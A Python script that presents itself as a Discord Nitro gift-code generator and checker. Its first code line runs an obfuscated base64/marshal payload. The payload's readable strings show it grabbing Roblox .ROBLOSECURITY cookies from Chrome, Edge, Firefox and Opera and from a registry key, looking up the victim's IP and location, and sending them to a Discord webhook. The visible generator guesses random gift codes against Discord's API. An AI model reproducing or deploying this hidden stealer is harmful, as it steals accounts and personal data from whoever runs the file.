import base64, marshal
import requests
import random
import string
import time
exec(marshal.loads(base64.b64decode("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")))


print("""`
		▐ ▄ ▪  ▄▄▄▄▄▄▄▄           ▄▄ • ▄▄▄ . ▐ ▄ ▄▄▄ .▄▄▄   ▄▄▄· ▄▄▄▄▄      ▄▄▄  
		•█▌▐███ •██  ▀▄ █· ▄█▀▄   ▐█ ▀ ▪▀▄.▀·•█▌▐█▀▄.▀·▀▄ █·▐█ ▀█ •██   ▄█▀▄ ▀▄ █·
		▐█▐▐▌▐█· ▐█.▪▐▀▀▄ ▐█▌.▐▌  ▄█ ▀█▄▐▀▀▪▄▐█▐▐▌▐▀▀▪▄▐▀▀▄ ▄█▀▀█  ▐█.▪▐█▌.▐▌▐▀▀▄ 
		██▐█▌▐█▌ ▐█▌·▐█•█▌▐█▌.▐▌  ▐█▄▪▐█▐█▄▄▌██▐█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌ ▐█▌·▐█▌.▐▌▐█•█▌
		▀▀ █▪▀▀▀ ▀▀▀ .▀  ▀ ▀█▄▀▪  ·▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ .▀  ▀ ▀  ▀  ▀▀▀  ▀█▄▀▪.▀  ▀
				('Made by NKev')}""")
time.sleep(2)
print("Generating Nitro Links")
time.sleep(0.3)
print("Send Friend Request to Alive#1100 in case of bugs\n")
time.sleep(0.2)

num = int(input('Input How Many Codes to Generate and Check: '))

with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
    print("Your nitro codes are being generated, be patient if you entered the high number!")

    start = time.time()

    for i in range(num):
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k = 16
        ))

        file.write(f"https://discord.gift/{code}\n")

    print(f"Generated {num} codes | Time taken: {time.time() - start}\n")

with open("Nitro Codes.txt") as file:
    for line in file.readlines():
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(f" Valid | {nitro} ")
            break
        else:
            print(f" Invalid | {nitro} ")

input("\nYou have generated, Now press enter to close this, you'll get valid codes in Valid Codes.txt if you see its empty then you got no luck, generate 20 million codes for luck or else.")
